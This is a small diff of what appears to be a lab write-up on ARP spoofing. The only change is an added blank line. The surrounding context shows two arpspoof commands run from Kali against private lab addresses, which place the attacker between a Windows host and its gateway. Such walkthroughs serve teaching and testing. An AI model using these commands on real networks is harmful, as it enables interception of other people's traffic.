@@ -30,6 +30,7 @@ IP forwarding is set to 0 by default. Because this change is made dynamically in
 I opened two separate terminal windows on Kali. I ran the first command below, which tells the gateway that we are Windows (-t being target):
 
 ```arpspoof -i eth0 -t 10.0.2.1 10.0.2.4```
+
 Then, in a second terminal, I ran a modified version, which tells Windows that we are the gateway:
 
 ```arpspoof -i eth0 -t 10.0.2.4 10.0.2.1```
